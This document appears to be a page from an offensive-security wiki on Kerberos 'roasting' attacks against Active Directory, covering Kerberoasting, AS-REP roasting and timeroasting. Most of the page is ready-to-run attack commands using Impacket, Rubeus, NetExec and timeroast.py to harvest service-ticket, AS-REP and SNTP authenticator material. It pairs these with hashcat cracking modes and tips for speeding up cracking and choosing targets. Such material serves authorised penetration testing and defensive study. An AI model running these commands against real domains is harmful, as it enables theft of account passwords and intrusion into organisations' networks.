---
title: "Roasting: extracting crackable material from Kerberos"
description: "Obtaining offline-crackable Kerberos material without touching a host: Kerberoasting service accounts, AS-REP roasting accounts without pre-authentication, and timeroasting through unauthenticated time sync."
keywords:
  - kerberoasting
  - AS-REP roasting
  - timeroasting
  - service accounts
  - hashcat
---

# Roasting

Roasting abuses the fact that parts of the Kerberos exchange are encrypted with an account's long-term key. Any domain user can *ask* the KDC for these encrypted blobs, then crack them offline to recover the account's password. No code runs on a target and no admin rights are needed, which makes roasting one of the first things to try with a single domain credential, and in one case with none at all.

## Kerberoasting

When you request a service ticket (TGS) for an account that has a **Service Principal Name**, part of the ticket is encrypted with that service account's password-derived key. Request tickets for every SPN-bearing account and crack the blobs offline:

```bash
# Impacket: request TGS for all SPN accounts (exclude computers via the query)
GetUserSPNs.py -request -dc-ip <dc> example.local/user:pass -outputfile kerb.hash

# Rubeus on-host
Rubeus.exe kerberoast /outfile:kerb.hash

# NetExec, straight to a hash file over LDAP
nxc ldap <dc> -u user -p pass --kerberoasting kerb.hash

hashcat -m 13100 kerb.hash wordlist.txt -r rules/best64.rule     # RC4 (etype 23)
```

- Target **RC4 (etype 23)** tickets: `-m 13100` cracks far faster than AES (`-m 19600/19700`). Request RC4 explicitly where the account allows it.
- **Exclude computer accounts**: their passwords are 120-character random strings and will never crack, so filter to `objectCategory=person`.
- Service accounts are disproportionately privileged and their passwords disproportionately weak (set once, years ago), which is why Kerberoasting is so productive.

## AS-REP roasting

If an account has **"Do not require Kerberos preauthentication"** set (`DONT_REQ_PREAUTH` in UAC), the KDC returns an AS-REP whose encrypted part is derived from the account's key, to **anyone**, with no credential required:

```bash
# Impacket: find and roast accounts without pre-auth (works unauthenticated with a user list)
GetNPUsers.py example.local/ -usersfile users.txt -no-pass -dc-ip <dc>
GetNPUsers.py example.local/user:pass -request          # authenticated: enumerate + roast
nxc ldap <dc> -u user -p pass --asreproast asrep.hash   # NetExec

hashcat -m 18200 asrep.hash wordlist.txt                # AS-REP (etype 23)
```

This is the one roast that can run from a fully unauthenticated position, given a list of candidate usernames.

## Timeroasting

Timeroasting abuses unauthenticated NTP: a domain controller's SNTP service returns an authenticator computed over a **computer account's RID and key**, with no credential needed. Collecting these yields crackable material for machine accounts:

```bash
# Request SNTP authenticators keyed by RID, producing hashcat-crackable output
timeroast.py <dc> -o timeroast.hash
hashcat -m 31300 timeroast.hash wordlist.txt
```

Machine-account passwords are usually strong, so timeroasting mainly finds non-default or manually set computer passwords, but it needs no authentication at all.

## Exploitation notes

- A cracked service account is immediately reusable: it often has local admin on its application servers and feeds [pass-the-ticket](pass-the-ticket.md) and [silver tickets](forged-tickets.md).
- Request **RC4** tickets wherever possible; a domain that enforces AES-only keys on service accounts blunts the crack speed, though the ticket is still issued.
- Kerberoasting needs only one valid credential, AS-REP roasting can need none, so both belong at the very start of an engagement alongside [enumeration](spn-discovery.md).

## Tools

- **Impacket** (`GetUserSPNs.py`, `GetNPUsers.py`): Kerberoast and AS-REP roast.
- **Rubeus** (`kerberoast`, `asreproast`): on-host roasting with etype control.
- **hashcat**: modes 13100 (Kerberoast), 18200 (AS-REP), 31300 (timeroast).

## References

- [GhostPack Rubeus (kerberoast / asreproast)](https://github.com/GhostPack/Rubeus)
- [ropnop Kerbrute](https://github.com/ropnop/kerbrute)
- [SecuraBV Timeroast (Tom Tervoort)](https://github.com/SecuraBV/Timeroast)
- [hashcat: example hashes and modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
